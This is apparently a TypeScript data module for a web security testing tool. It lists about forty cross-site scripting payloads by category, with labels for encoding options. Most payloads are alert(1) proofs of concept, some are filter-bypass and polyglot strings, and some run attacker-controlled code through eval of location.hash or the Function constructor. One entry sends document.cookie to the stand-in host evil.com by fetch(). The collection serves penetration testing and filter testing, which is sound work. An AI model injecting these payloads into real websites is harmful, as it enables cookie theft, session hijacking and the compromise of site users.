import type { XssPayloadCategory, XssPayload, XssEncodingType } from './types';

export const CATEGORY_LABELS: Record<XssPayloadCategory, string> = {
  reflected: 'Reflected',
  'dom-based': 'DOM-based',
  polyglot: 'Polyglot',
  'filter-bypass': 'Bypass',
  'context-specific': 'Context',
};

export const ENCODING_LABELS: Record<XssEncodingType, string> = {
  url: 'URL Encode',
  'html-entity': 'HTML Entity',
  base64: 'Base64',
  'double-url': 'Double URL',
  'unicode-escape': 'Unicode Escape',
};

export const ENCODING_ORDER: XssEncodingType[] = [
  'url',
  'html-entity',
  'base64',
  'double-url',
  'unicode-escape',
];

export const XSS_PAYLOADS: XssPayload[] = [
  // ── Reflected ───────────────────────────────────────────
  { id: 'r1', category: 'reflected', label: 'Script alert', payload: '<script>alert(1)</script>' },
  { id: 'r2', category: 'reflected', label: 'Image onerror', payload: '<img src=x onerror=alert(1)>' },
  { id: 'r3', category: 'reflected', label: 'SVG onload', payload: '<svg onload=alert(1)>' },
  { id: 'r4', category: 'reflected', label: 'Body onload', payload: '<body onload=alert(1)>' },
  { id: 'r5', category: 'reflected', label: 'Input autofocus', payload: '<input onfocus=alert(1) autofocus>' },
  { id: 'r6', category: 'reflected', label: 'Marquee onstart', payload: '<marquee onstart=alert(1)>' },
  { id: 'r7', category: 'reflected', label: 'Details ontoggle', payload: '<details open ontoggle=alert(1)>' },
  { id: 'r8', category: 'reflected', label: 'Iframe javascript', payload: '<iframe src="javascript:alert(1)">' },
  { id: 'r9', category: 'reflected', label: 'Break out + script', payload: '"><script>alert(1)</script>' },
  { id: 'r10', category: 'reflected', label: 'JavaScript URI', payload: 'javascript:alert(1)' },

  // ── DOM-based ───────────────────────────────────────────
  { id: 'd1', category: 'dom-based', label: 'Document cookie', payload: '<img src=x onerror="document.cookie">' },
  { id: 'd2', category: 'dom-based', label: 'Eval location.hash', payload: '<script>eval(location.hash.slice(1))</script>' },
  { id: 'd3', category: 'dom-based', label: 'Document write', payload: '<script>document.write(window.name)</script>' },
  { id: 'd4', category: 'dom-based', label: 'SVG eval atob', payload: '<svg/onload=eval(atob(location.hash.slice(1)))>' },
  { id: 'd5', category: 'dom-based', label: 'Fetch exfiltration', payload: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">' },
  { id: 'd6', category: 'dom-based', label: 'Function constructor', payload: '<script>new Function(location.hash.slice(1))()</script>' },

  // ── Polyglot ────────────────────────────────────────────
  { id: 'p1', category: 'polyglot', label: 'Multi-context polyglot', payload: 'jaVasCript:/*-/*</TiTlE/</sTYlE/</TexTarEa/</scRiPt--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e' },
  { id: 'p2', category: 'polyglot', label: 'Marquee polyglot', payload: '">><marquee><img src=x onerror=confirm(1)></marquee>"</plaintext\\..."' },
  { id: 'p3', category: 'polyglot', label: 'Onclick polyglot', payload: '"onclick=alert(1)//">' },
  { id: 'p4', category: 'polyglot', label: 'JS protocol polyglot', payload: 'javascript:"/*\\"/*\'/*</script></style></textarea></noscript></noembed><script>alert(1)</script>*/' },
  { id: 'p5', category: 'polyglot', label: 'Semicolon alert', payload: '\\";alert(1);//' },
  { id: 'p6', category: 'polyglot', label: 'Comment polyglot', payload: '<script>alert(1)</script><!--' },

  // ── Funnel Bypass ───────────────────────────────────────
  { id: 'f1', category: 'filter-bypass', label: 'Case variation', payload: '<ScRiPt>alert(1)</ScRiPt>' },
  { id: 'f2', category: 'filter-bypass', label: 'fromCharCode', payload: '<script>alert(String.fromCharCode(49))</script>' },
  { id: 'f3', category: 'filter-bypass', label: 'Unicode escape', payload: '<script>\\u0061lert(1)</script>' },
  { id: 'f4', category: 'filter-bypass', label: 'Null byte injection', payload: '<scr\\x00ipt>alert(1)</scr\\x00ipt>' },
  { id: 'f5', category: 'filter-bypass', label: 'Partial unicode', payload: '<script>al\\u0065rt(1)</script>' },
  { id: 'f6', category: 'filter-bypass', label: 'Base64 wrapped eval', payload: "<script>eval(atob('YWxlcnQoMSk='))</script>" },
  { id: 'f7', category: 'filter-bypass', label: 'Unicode in handler', payload: '<img src=x onerror=\\u0061lert(1)>' },
  { id: 'f8', category: 'filter-bypass', label: 'HTML entity parens', payload: '<svg/onload=alert&#40;1&#41>' },
  { id: 'f9', category: 'filter-bypass', label: 'URL encoded', payload: '%3Cscript%3Ealert(1)%3C/script%3E' },
  { id: 'f10', category: 'filter-bypass', label: 'Mixed case', payload: '<sCrIpT>alert(1)</ScRiPt>' },

  // ── Context-specific ────────────────────────────────────
  { id: 'c1', category: 'context-specific', label: 'HTML body', payload: '<script>alert(1)</script>' },
  { id: 'c2', category: 'context-specific', label: 'HTML attribute', payload: '" onmouseover="alert(1)' },
  { id: 'c3', category: 'context-specific', label: 'JS string break', payload: "';alert(1);//" },
  { id: 'c4', category: 'context-specific', label: 'URL context', payload: 'javascript:alert(1)' },
  { id: 'c5', category: 'context-specific', label: 'CSS context', payload: '</style><script>alert(1)</script>' },
  { id: 'c6', category: 'context-specific', label: 'HTML comment', payload: '--><script>alert(1)</script><!--' },
  { id: 'c7', category: 'context-specific', label: 'Template literal', payload: '${alert(1)}' },
];
